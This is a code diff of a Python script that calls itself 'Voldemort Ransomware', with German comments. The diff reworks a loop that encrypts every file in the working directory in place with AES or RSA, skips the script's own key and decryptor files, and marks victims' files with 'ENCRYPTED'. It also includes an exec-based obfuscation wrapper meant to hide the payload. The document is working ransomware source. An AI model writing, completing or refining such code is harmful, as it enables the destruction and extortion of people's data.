@@ -40,14 +40,13 @@ from cryptography.fernet import Fernet
 {var3}=exec(zlib.decompress(base64.b85decode({var2}.decrypt({encrypted}))))
 """
         return obfuscated
-# Marker zur Kennzeichnung verschlüsselter Dateien
+
+# Der Rest deines originalen Codes hier
 MARKER = "ENCRYPTED"
 
-# AES Schlüssle generieren
 def generate_aes_key():
     return os.urandom(32)
 
-# AES verschlüsseln
 def aes_encrypt(key, data):
     iv = os.urandom(16)
     cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
@@ -55,16 +54,14 @@ def aes_encrypt(key, data):
     encrypted_data = iv + encryptor.update(data) + encryptor.finalize()
     return encrypted_data
 
-# RSA Schlüssel generieren
 def generate_rsa_key():
-    private_key = rsa .generate_private_key(
+    private_key = rsa.generate_private_key(
         public_exponent=65537,
         key_size=2048,
         backend=default_backend()
     )
     return private_key
 
-# RSA verschlüsseln
 def rsa_encrypt(public_key, data):
     encrypted_data = public_key.encrypt(
         data,
@@ -76,28 +73,11 @@ def rsa_encrypt(public_key, data):
     )
     return encrypted_data
 
-def checkIf():
-    # Dateien finden
-    files = []
-    for file in os.listdir():
-        if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py"or file == "aes_key.enc"  or file = "un_voldemort.py":
-            continue
-        if os.path.isfile(file):
-            files.append(file)
-
-# Dateien verschlüsseln
-    for file in files:
-        file_path = Path(file)
-        with file_path.open("rb") as thefile:
-            contents = thefile.read()
-
-# Bereits verschlüsselte Dateien überspringen
-        if MARKER.encode() in contents:
-            print(f"{file} ist bereits verschlüsselt.")
-            return False
-    
-    return True
-    
+def check_if_encrypted(filename):
+    if os.path.exists(filename):
+        with open(filename, 'rb') as f:
+            return MARKER.encode() in f.read()
+    return False
 
 def encrypt_files():
     print("\n=== Voldemort Ransomware ===")
@@ -132,33 +112,32 @@ def encrypt_files():
         print("Ungültige Wahl!")
         return
 
-
-
-# Dateien finden
-    files = []
-    for file in os.listdir():
-        if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py"or file == "aes_key.enc"  or file.startswith('.'):
-            continue
-        if os.path.isfile(file):
-            files.append(file)
-    print("Files to encrypt:", files)
-
-# Dateien verschlüsseln
+    # Dateien verschlüsseln
+    files = [file for file in os.listdir() 
+             if os.path.isfile(file) 
+             and file not in ("voldemort.py", "thekey.key", "decrypt.py", "aes_key.enc", "un_voldemort.py") 
+             and not file.startswith('.')]
+    
+    print("\nZu verschlüsselnde Dateien:", files)
+    
     for file in files:
-        file_path = Path(file)
-        with file_path.open("rb") as thefile:
-            contents = thefile.read()
-
-# Bereits verschlüsselte Dateien überspringen
-        if MARKER.encode() in contents:
-            print(f"{file} ist bereits verschlüsselt.")
-            continue
-
-        encrypted_data = encrypt_func(contents) + MARKER.encode()
-        with file_path.open("wb") as thefile:
-            thefile.write(encrypted_data)
-
-    print("Files successfully encrypted.")
+        try:
+            if check_if_encrypted(file):
+                print(f"{file} bereits verschlüsselt.")
+                continue
+                
+            with open(file, "rb") as f:
+                data = f.read()
+            
+            encrypted_data = encrypt_func(data) + MARKER.encode()
+            
+            with open(file, "wb") as f:
+                f.write(encrypted_data)
+            
+            print(f"{file} verschlüsselt.")
+            
+        except Exception as e:
+            print(f"Fehler bei {file}: {str(e)}")
 
 def main():
     encrypt_files()
